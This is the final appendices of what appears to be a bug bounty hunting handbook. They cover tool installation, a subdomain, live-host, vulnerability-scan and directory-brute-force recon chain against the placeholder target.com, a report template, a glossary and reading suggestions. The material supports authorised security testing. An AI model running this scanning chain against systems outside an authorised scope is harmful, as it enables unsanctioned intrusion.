go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/tomnomnom/waybackurls@latest
pip install arjun
git clone https://github.com/GerbenJavado/LinkFinder.git
```

## Appendix O — Common Recon Command Chain

```bash
subfinder -d target.com -o subs.txt
cat subs.txt | httpx -silent -title -tech-detect -o alive.txt
cat alive.txt | nuclei -silent -o nuclei_results.txt
echo target.com | waybackurls > wayback_urls.txt
gobuster dir -u https://target.com -w SecLists/Discovery/Web-Content/raft-large-directories.txt
```

## Appendix P — Bug Report Template

```markdown
## Title
[Vulnerability type] on [endpoint] leads to [consequence]

## Summary
[Mechanism, parameters involved, how it was discovered]

## Severity
[Low / Medium / High / Critical, with reasoning]

## Steps to Reproduce
1.
2.
3.

## Proof of Concept
[Attached file, request/response, or video]

## Impact
[Concrete, realistic worst-case scenario]

## Suggested Fix
[Only if root cause is well understood]
```

## Appendix Q — Glossary

**Asset scope** — the specific subdomains, applications, or products a program authorizes testing against.
**Blind vulnerability** — a bug whose result is not directly visible in the immediate response, requiring out-of-band or inferential confirmation.
**Bounty** — the monetary or reputational reward for a validated report.
**CVSS** — Common Vulnerability Scoring System, a standardized severity scale.
**Duplicate** — a valid finding already reported by another researcher.
**Out-of-band (OOB)** — confirming a vulnerability through a side channel (DNS, HTTP callback) rather than the direct response.
**Proof of Concept (PoC)** — supporting material demonstrating a vulnerability's exploitability.
**Scope** — the combined asset and vulnerability boundaries a program authorizes.
**Triage** — the process by which a security team validates and classifies a submitted report.
**Vulnerability Disclosure Program (VDP)** — a program accepting vulnerability reports without monetary reward.

## Appendix R — Acronyms

CORS · CSRF · CSTI · CVE · CVSS · DTD · IDOR · JWT · OAuth · RCE · SSRF · SSTI · TOCTOU · VDP · WSDL · XXE · XSS

## Appendix S — Further Reading

- OWASP Testing Guide
- OWASP Top Ten
- PortSwigger Web Security Academy
- PayloadsAllTheThings (`swisskyrepo/PayloadsAllTheThings`)
- disclose.io — coordinated disclosure legal framework reference

---

*End of First Edition. This handbook is a living document — future study sessions will expand existing chapters, add new vulnerability classes and case studies, and populate the personal notes sections throughout with real hunting experience.*
